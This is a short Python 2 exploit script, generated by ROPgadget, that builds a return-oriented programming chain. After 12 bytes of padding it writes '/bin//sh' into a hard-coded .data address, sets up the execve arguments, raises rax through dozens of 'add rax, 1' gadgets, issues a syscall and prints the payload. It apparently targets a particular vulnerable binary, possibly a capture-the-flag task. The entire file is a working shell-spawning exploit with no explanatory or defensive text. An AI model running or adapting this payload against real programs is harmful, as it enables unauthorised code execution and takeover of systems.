#!/usr/bin/env python2
# execve generated by ROPgadget

from struct import pack

# Padding goes here
p = 'a'*12

p += pack('<Q', 0x000000000040870e) # pop rsi ; ret
p += pack('<Q', 0x00000000004b40e0) # @ .data
p += pack('<Q', 0x000000000044bc03) # pop rax ; ret
p += '/bin//sh'
p += pack('<Q', 0x000000000044d781) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x000000000040870e) # pop rsi ; ret
p += pack('<Q', 0x00000000004b40e8) # @ .data + 8
p += pack('<Q', 0x000000000043bd15) # xor rax, rax ; ret
p += pack('<Q', 0x000000000044d781) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000401871) # pop rdi ; ret
p += pack('<Q', 0x00000000004b40e0) # @ .data
p += pack('<Q', 0x000000000040870e) # pop rsi ; ret
p += pack('<Q', 0x00000000004b40e8) # @ .data + 8
p += pack('<Q', 0x000000000040163b) # pop rdx ; ret
p += pack('<Q', 0x00000000004b40e8) # @ .data + 8
p += pack('<Q', 0x000000000043bd15) # xor rax, rax ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x000000000046d650) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004011fa) # syscall
print p